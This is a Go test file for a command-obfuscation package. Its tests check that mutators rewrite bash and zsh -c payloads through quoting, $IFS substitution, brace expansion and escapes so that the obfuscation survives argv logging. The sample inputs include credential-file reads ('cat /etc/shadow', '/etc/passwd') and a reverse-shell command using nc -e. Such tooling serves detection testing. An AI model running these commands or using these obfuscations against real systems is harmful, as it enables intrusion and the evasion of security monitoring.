package mutate

import (
	"strings"
	"testing"
)

// bashC wraps a payload as a bash -c invocation.
func bashC(payload string) string { return `bash -c "` + payload + `"` }

func TestNixMutatorsRequireDashCPayload(t *testing.T) {
	// A bare command line has no -c payload; every nix mutator must decline it,
	// because the obfuscation would not survive argv logging.
	bare := "cat /etc/shadow"
	for _, m := range []Mutator{
		nixQuoteInsertion{}, nixBackslashEscape{}, nixEmptyExpansion{},
		nixAnsiCQuote{}, nixLineContinuation{}, nixTrailingComment{},
		nixIFSSubstitution{}, nixBraceExpansion{}, nixZshForcedSplit{},
	} {
		if got := m.Apply(bare); got != nil {
			t.Errorf("%s fired on a bare command line: %+v", m.Name(), got)
		}
	}
}

func TestNixIFSExcludesZsh(t *testing.T) {
	// $IFS splitting works under bash/sh, not zsh.
	if got := (nixIFSSubstitution{}).Apply(bashC("cat /etc/shadow")); len(got) == 0 {
		t.Error("ifs-substitution should fire under bash -c")
	} else if !strings.Contains(got[0].Value, "${IFS}") {
		t.Errorf("expected ${IFS}, got %q", got[0].Value)
	}
	if got := (nixIFSSubstitution{}).Apply(`zsh -c "cat /etc/shadow"`); got != nil {
		t.Errorf("ifs-substitution must not fire under zsh -c: %+v", got)
	}
}

func TestNixZshForcedSplitOnlyZsh(t *testing.T) {
	if got := (nixZshForcedSplit{}).Apply(`zsh -c "cat /etc/shadow"`); len(got) == 0 {
		t.Error("zsh-forced-split should fire under zsh -c")
	} else if !strings.Contains(got[0].Value, "${=IFS}") {
		t.Errorf("expected ${=IFS}, got %q", got[0].Value)
	}
	if got := (nixZshForcedSplit{}).Apply(bashC("cat /etc/shadow")); got != nil {
		t.Errorf("zsh-forced-split must not fire under bash -c: %+v", got)
	}
}

func TestNixBraceOnlyBash(t *testing.T) {
	if got := (nixBraceExpansion{}).Apply(bashC("cat /etc/passwd")); len(got) == 0 {
		t.Error("brace-expansion should fire under bash -c")
	} else if !strings.Contains(got[0].Value, "{cat,/etc/passwd}") {
		t.Errorf("unexpected brace form: %q", got[0].Value)
	}
	// sh may be dash, which has no brace expansion, so decline it.
	if got := (nixBraceExpansion{}).Apply(`sh -c "cat /etc/passwd"`); got != nil {
		t.Errorf("brace-expansion must fire only under bash: %+v", got)
	}
}

func TestNixAnsiCQuoteRoundTrips(t *testing.T) {
	got := (nixAnsiCQuote{}).Apply(bashC("nc -e /bin/sh 10.0.0.1"))
	if len(got) == 0 {
		t.Fatal("ansi-c-quote should fire")
	}
	if !strings.Contains(got[0].Value, "$'nc'") {
		t.Errorf("expected $'nc', got %q", got[0].Value)
	}
}

func TestNixBackslashSkipsEscapeLetters(t *testing.T) {
	// Escaping must never place a backslash before n/t/etc. (would form \n \t).
	got := (nixBackslashEscape{}).Apply(bashC("netstat -an"))
	if len(got) == 0 {
		return // acceptable if every letter was an escape letter
	}
	v := got[0].Value
	for _, bad := range []string{`\n`, `\t`, `\a`, `\b`, `\e`, `\f`, `\r`, `\v`} {
		if strings.Contains(v, bad) {
			t.Errorf("backslash-escape produced a C escape %q in %q", bad, v)
		}
	}
}

func TestNixQuoteAwareSeparators(t *testing.T) {
	// A space inside inner quotes is not a separator and must not be rewritten by
	// ifs-substitution.
	payload := `echo 'a b' c`
	spaces := unquotedSpaces(payload)
	// unquoted spaces: after echo, and before c. The space inside 'a b' is quoted.
	if len(spaces) != 2 {
		t.Fatalf("expected 2 unquoted spaces, got %d in %q", len(spaces), payload)
	}
}

func TestNixIsPayloadAware(t *testing.T) {
	interp, s, e, ok := nixPayload(`/bin/bash -c "id -u"`)
	if !ok || interp != "bash" {
		t.Fatalf("expected bash payload, got interp=%q ok=%v", interp, ok)
	}
	if `/bin/bash -c "id -u"`[s:e] != "id -u" {
		t.Errorf("payload extraction wrong: %q", `/bin/bash -c "id -u"`[s:e])
	}
	if _, _, _, ok := nixPayload("curl http://x/y"); ok {
		t.Error("non-shell command should not yield a payload")
	}
}
